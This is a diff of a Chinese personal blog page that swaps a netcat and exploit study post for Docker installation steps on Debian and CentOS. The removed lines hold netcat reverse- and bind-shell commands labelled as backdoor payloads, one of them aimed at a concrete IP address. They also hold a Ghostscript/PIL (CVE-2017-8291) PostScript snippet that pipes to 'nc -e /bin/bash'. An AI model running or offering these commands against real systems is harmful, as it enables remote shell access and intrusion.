@@ -79,16 +79,16 @@
 
 
 
-<meta name="description" content="nc学习 自己vps上的监听命令:    123nc -l -p 443-l指定监听模式,  -p xxx指定监听的端口,上面以443为例  后门playload    12nc -e /bin/bash &amp;lt;IP&amp;gt; &amp;lt;PORT&amp;gt;nc -nv 138.197.214.134 443 -c bash 执行上述后,在监听方就可以执行任意命令  反向执行监听方:  1nc -lp">
+<meta name="description" content="kali安装前的准备:step1:1uname -r //查看内核版本 Docker需要一个64位的安装，无论你的Debian版本。 此外，你的内核必须至少是3.10。 最新的3.10次要版本或更新的维护版本也是可以接受的   step2:对于Debian wheezy用户i必须提供反向端口，启用backports  用任意编辑器打开/etc/apt/sources.list.d/backport">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2017-11-3">
-<meta property="og:url" content="http://yoursite.com/2017/11/06/daily_1/index.html">
+<meta property="og:title" content="docker安装">
+<meta property="og:url" content="http://yoursite.com/2017/11/07/kali_docker/index.html">
 <meta property="og:site_name" content="Rainer">
-<meta property="og:description" content="nc学习 自己vps上的监听命令:    123nc -l -p 443-l指定监听模式,  -p xxx指定监听的端口,上面以443为例  后门playload    12nc -e /bin/bash &amp;lt;IP&amp;gt; &amp;lt;PORT&amp;gt;nc -nv 138.197.214.134 443 -c bash 执行上述后,在监听方就可以执行任意命令  反向执行监听方:  1nc -lp">
-<meta property="og:updated_time" content="2017-11-08T04:53:49.922Z">
+<meta property="og:description" content="kali安装前的准备:step1:1uname -r //查看内核版本 Docker需要一个64位的安装，无论你的Debian版本。 此外，你的内核必须至少是3.10。 最新的3.10次要版本或更新的维护版本也是可以接受的   step2:对于Debian wheezy用户i必须提供反向端口，启用backports  用任意编辑器打开/etc/apt/sources.list.d/backport">
+<meta property="og:updated_time" content="2017-11-08T05:11:13.011Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="2017-11-3">
-<meta name="twitter:description" content="nc学习 自己vps上的监听命令:    123nc -l -p 443-l指定监听模式,  -p xxx指定监听的端口,上面以443为例  后门playload    12nc -e /bin/bash &amp;lt;IP&amp;gt; &amp;lt;PORT&amp;gt;nc -nv 138.197.214.134 443 -c bash 执行上述后,在监听方就可以执行任意命令  反向执行监听方:  1nc -lp">
+<meta name="twitter:title" content="docker安装">
+<meta name="twitter:description" content="kali安装前的准备:step1:1uname -r //查看内核版本 Docker需要一个64位的安装，无论你的Debian版本。 此外，你的内核必须至少是3.10。 最新的3.10次要版本或更新的维护版本也是可以接受的   step2:对于Debian wheezy用户i必须提供反向端口，启用backports  用任意编辑器打开/etc/apt/sources.list.d/backport">
 
 
 
@@ -118,13 +118,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/11/06/daily_1/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/11/07/kali_docker/"/>
 
 
 
 
 
-  <title>2017-11-3 | Rainer</title>
+  <title>docker安装 | Rainer</title>
   
 
 
@@ -251,7 +251,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/06/daily_1/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/07/kali_docker/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Rainer">
@@ -268,7 +268,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">2017-11-3</h1>
+          <h1 class="post-title" itemprop="name headline">docker安装</h1>
         
 
         <div class="post-meta">
@@ -280,8 +280,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-06T22:59:37+08:00">
-                2017-11-06
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-07T23:32:00+08:00">
+                2017-11-07
               </time>
             
 
@@ -303,8 +303,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
+                  <a href="/categories/docker/" itemprop="url" rel="index">
+                    <span itemprop="name">docker</span>
                   </a>
                 </span>
 
@@ -345,31 +345,50 @@
       
 
       
-        <h1 id="nc学习"><a href="#nc学习" class="headerlink" title="nc学习"></a>nc学习</h1><ul>
-<li>自己vps上的监听命令:  </li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">nc -l -p 443</div><div class="line">-l指定监听模式,  </div><div class="line">-p xxx指定监听的端口,上面以443为例</div></pre></td></tr></table></figure>
+        <h1 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h1><h2 id="安装前的准备"><a href="#安装前的准备" class="headerlink" title="安装前的准备:"></a>安装前的准备:</h2><h3 id="step1"><a href="#step1" class="headerlink" title="step1:"></a>step1:</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname -r //查看内核版本</div></pre></td></tr></table></figure>
+<p>Docker需要一个64位的安装，无论你的Debian版本。 此外，你的内核必须至少是3.10。 最新的3.10次要版本或更新的维护版本也是可以接受的  </p>
+<h3 id="step2"><a href="#step2" class="headerlink" title="step2:"></a>step2:</h3><p>对于Debian wheezy用户i必须提供反向端口，启用backports</p>
 <ul>
-<li>后门playload  </li>
+<li>用任意编辑器打开/etc/apt/sources.list.d/backports.list文件，如果没有这个文件，就创建一个。</li>
+<li>删除现有所有条目后添加一条新的反向端口条目<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">deb http://http.debian.net/debian wheezy-backports main</div></pre></td></tr></table></figure>
+</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/bash &lt;IP&gt; &lt;PORT&gt;</div><div class="line">nc -nv 138.197.214.134 443 -c bash</div></pre></td></tr></table></figure>
-<p>执行上述后,在<em>监听方</em>就可以执行任意命令</p>
-<ul>
-<li>反向执行<br>监听方:</li>
+<h3 id="step3"><a href="#step3" class="headerlink" title="step3:"></a>step3:</h3><p>更新软件包信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## apt-get update</div></pre></td></tr></table></figure></p>
+<p>更新存储库信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install apt-transport-https ca-certificates gnupg2</div></pre></td></tr></table></figure></p>
+<p>添加新的GPG key（这里可能会失败几次，提示从公钥服务器接受失败，多试几次就可以了）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">## apt-key adv \</div><div class="line">  　　--keyserver hkp://ha.pool.sks-keyservers.net:80 \</div><div class="line">  　　--recv-keys 58118E89F3A912897C070ADBF76221572C52609D</div></pre></td></tr></table></figure></p>
+<p>用任意编辑器打开/etc/apt/sources.list.d/docker.list文件，如果不存在，就创建一个<br>删除现有的所有条目，并添加新的条目（我只列出wheezy添加的，其他版本的请自行到官网查看）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">deb https://apt.dockerproject.org/repo debian-wheezy main</div></pre></td></tr></table></figure></p>
+<p>更新apt存储库，并验证apt存储库是正确的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">## apt-get update</div><div class="line">## apt-cache policy docker-engine</div></pre></td></tr></table></figure></p>
+<h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><ul>
+<li><p>1.更新apt存储库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## apt-get update</div></pre></td></tr></table></figure>
+</li>
+<li><p>2.安装Docker</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## apt-get install docker-engine</div></pre></td></tr></table></figure>
+</li>
+<li><p>3.启动Docker服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## service docker start</div></pre></td></tr></table></figure>
+</li>
+<li><p>4.更新Docker</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## apt-get upgrade docker-engine</div></pre></td></tr></table></figure>
+</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lp 443 -c bash</div></pre></td></tr></table></figure>
-<p>连接方:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -nv 138.197.214.134 443</div></pre></td></tr></table></figure>
-<p><em>连接方</em>就可执行任意命令</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">nc -l -p 443 &gt; 1.txt</div><div class="line">nc -nv 10.1.1.12 443 -q 1 #将接受到的内容写入文件</div><div class="line"></div><div class="line"><span class="meta">#</span>命令执行结果传输</div><div class="line">ls -l|nc -nv 10.1.1.12 443 #执行命令的同时将结果发送到nc连接</div><div class="line"></div><div class="line"><span class="meta">#</span>文件传输</div><div class="line">nc -lp 443 &gt; 2.mp4   #接受媒体</div><div class="line">nc -nv 10.1.1.12 443 &lt; a.mp4 -q 1  #发送媒体</div><div class="line"></div><div class="line"><span class="meta">#</span>端口扫描</div><div class="line">nc -nvz 10.1.1.11 1-65535  #TCP端口扫描</div><div class="line">nc -nvzu 10.1.1.11 1-65535   #UDP端口扫描</div></pre></td></tr></table></figure>
-<h2 id="Exploiting-Python-PIL-Module-Command-Execution-Vulnerability"><a href="#Exploiting-Python-PIL-Module-Command-Execution-Vulnerability" class="headerlink" title="Exploiting Python PIL Module Command Execution Vulnerability"></a>Exploiting Python PIL Module Command Execution Vulnerability</h2><p><a href="https://paper.seebug.org/405/" target="_blank" rel="external">https://paper.seebug.org/405/</a><br>PIL (Python Image Library) 应该是 Python 图片处理库中运用最广泛的，它拥有强大的功能和简洁的API。很多Python Web应用在需要实现处理图片的功能时，都会选择使用PIL。</p>
-<p>PIL在对 eps 图片格式进行处理的时候，如果环境内装有 GhostScript，则会调用 GhostScript 在dSAFER模式下处理图片，即使是最新版本的PIL模块，也会受到 GhostButt CVE-2017-8291 dSAFER模式Bypass漏洞的影响，产生命令执行漏洞。</p>
-<ul>
-<li>poc使用说明:</li>
-<li>获取图像长宽高时<br>poc文件为.eps格式,但是可以更改<em>后缀名</em>,因为识别文件依赖于文件头<br>更改第89行:  </li>
+<h2 id="卸载Docker"><a href="#卸载Docker" class="headerlink" title="卸载Docker"></a>卸载Docker</h2><ul>
+<li><p>卸载docker软件包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## apt-get purge docker-engine</div></pre></td></tr></table></figure>
+</li>
+<li><p>卸载docker所有程序包和依赖关系</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## apt-get autoremove --purge docker-engine</div></pre></td></tr></table></figure>
+</li>
+<li><p>如果要删除所有图像，容器和卷，请运行以下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## rm -rf /var/lib/docker</div></pre></td></tr></table></figure>
+</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">16#</span>3f0 0 put</div><div class="line"></div><div class="line">currentdevice null false mark /OutputFile (%pipe%nc -e /bin/bash &lt;ip&gt; &lt;port&gt;)</div><div class="line">.putdeviceparams</div><div class="line">1 true .outputpage</div></pre></td></tr></table></figure>
-<p><code>(%pipe%nc -e /bin/bash &lt;ip&gt; &lt;port&gt;)</code> 处就可以更换playload<br>此处为使用nc连接</p>
+<h1 id="centos7"><a href="#centos7" class="headerlink" title="centos7"></a>centos7</h1><h2 id="CentOS7环境下安装Docker"><a href="#CentOS7环境下安装Docker" class="headerlink" title="CentOS7环境下安装Docker"></a>CentOS7环境下安装Docker</h2><h3 id="安装包的组成"><a href="#安装包的组成" class="headerlink" title="安装包的组成"></a>安装包的组成</h3><p>2014年7月7日，CentOS官方发布了首个CentOS7正式版。CentOS7的Linux内核升级到3.10.0，对Linux容器支持得到大大增强。</p>
+<p>在CentOS7的Extra仓库中，有Docker的发布版。这个发布版包含了docker的一个比较老的版本(0.11.1)。相信随着Docker稳定版本的逐步退出，CentOS7会升级源仓库中的docker版本。</p>
+<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>在CentOS7下可以直接从源仓库安装docker，命令如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo yum install docker</div></pre></td></tr></table></figure></p>
+<p>安装程序将docker程序安装到<code>/usr/bin</code>目录下，配置文件安装在<code>/etc/sysconfig/docker</code>。安装好docker之后，可以将docker加入到启动服务组中，命令如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo systemctl <span class="built_in">enable</span> docker.service</div></pre></td></tr></table></figure></p>
+<h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>手动启动docker服务器，使用命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo systemctl start docker.service</div></pre></td></tr></table></figure></p>
+<p>初次启动需要一些时间，启动好后，你可以使用docker命令管理和运行你的docker镜像和容器了。</p>
 
       
     </div>
@@ -394,14 +413,18 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2017/11/06/test/" rel="next" title="test">
+                <i class="fa fa-chevron-left"></i> test
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/11/06/2017_11_14/" rel="prev" title="PHPstudy">
-                PHPstudy <i class="fa fa-chevron-right"></i>
+              <a href="/2017/11/08/docke/" rel="prev" title="docker常用命令记录">
+                docker常用命令记录 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -538,7 +561,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#nc学习"><span class="nav-number">1.</span> <span class="nav-text">nc学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploiting-Python-PIL-Module-Command-Execution-Vulnerability"><span class="nav-number">1.1.</span> <span class="nav-text">Exploiting Python PIL Module Command Execution Vulnerability</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#kali"><span class="nav-number">1.</span> <span class="nav-text">kali</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#安装前的准备"><span class="nav-number">1.1.</span> <span class="nav-text">安装前的准备:</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#step1"><span class="nav-number">1.1.1.</span> <span class="nav-text">step1:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#step2"><span class="nav-number">1.1.2.</span> <span class="nav-text">step2:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#step3"><span class="nav-number">1.1.3.</span> <span class="nav-text">step3:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安装docker"><span class="nav-number">1.2.</span> <span class="nav-text">安装docker</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#卸载Docker"><span class="nav-number">1.3.</span> <span class="nav-text">卸载Docker</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#centos7"><span class="nav-number">2.</span> <span class="nav-text">centos7</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CentOS7环境下安装Docker"><span class="nav-number">2.1.</span> <span class="nav-text">CentOS7环境下安装Docker</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#安装包的组成"><span class="nav-number">2.1.1.</span> <span class="nav-text">安装包的组成</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#安装"><span class="nav-number">2.1.2.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#运行"><span class="nav-number">2.1.3.</span> <span class="nav-text">运行</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
